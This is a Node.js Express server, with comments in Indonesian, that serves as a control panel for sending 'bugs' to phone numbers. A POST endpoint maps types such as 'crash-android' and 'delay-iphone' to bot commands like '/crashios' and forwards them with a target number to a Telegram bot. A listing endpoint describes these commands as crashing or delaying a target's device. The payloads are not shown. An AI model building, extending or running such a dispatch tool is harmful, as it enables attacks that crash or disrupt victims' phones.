// server.js
import express from "express";
import fetch from "node-fetch";
import accounts from "./account.js";

const app = express();
app.use(express.json());

// ======== KONFIGURASI TELEGRAM ========
const TELEGRAM_BOT_TOKEN = "ISI_TOKEN_BOT_LU";
const TELEGRAM_CHAT_ID = "ISI_CHAT_ID_LU";

// ======== ENDPOINT ACCOUNT LOGIN ========
app.get("/api/account", (req, res) => {
  res.json(accounts);
});

// ======== ENDPOINT KIRIM BUG ========
app.post("/api/send-bug", async (req, res) => {
  try {
    const { number, type } = req.body;

    // Mapping tipe bug ke command bot
    const commandMap = {
      "crash-android": "/crashandro",
      "crash-iphone": "/crashios",
      "delay-android": "/delayandro",
      "delay-iphone": "/delayios"
    };

    const cmd = commandMap[type];
    if (!cmd) {
      return res.status(400).json({ success: false, message: "Tipe bug tidak valid" });
    }

    const text = `${cmd} ${number}`;

    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
    const body = {
      chat_id: TELEGRAM_CHAT_ID,
      text
    };

    await fetch(url, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(body)
    });

    res.json({ success: true, message: "Bug terkirim ke Telegram" });
  } catch (err) {
    console.error("Error send bug:", err);
    res.status(500).json({ success: false, message: "Gagal mengirim bug" });
  }
});

// ======== ENDPOINT LIST COMMAND ========
app.get("/api/commands", (req, res) => {
  const commands = [
    { type: "crash-android", command: "/crashandro", description: "Crash Android target" },
    { type: "crash-iphone", command: "/crashios", description: "Crash iPhone target" },
    { type: "delay-android", command: "/delayandro", description: "Delay Android target" },
    { type: "delay-iphone", command: "/delayios", description: "Delay iPhone target" }
  ];
  res.json({ success: true, commands });
});

// ======== START SERVER ========
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`Server running at http://localhost:${PORT}`);
});
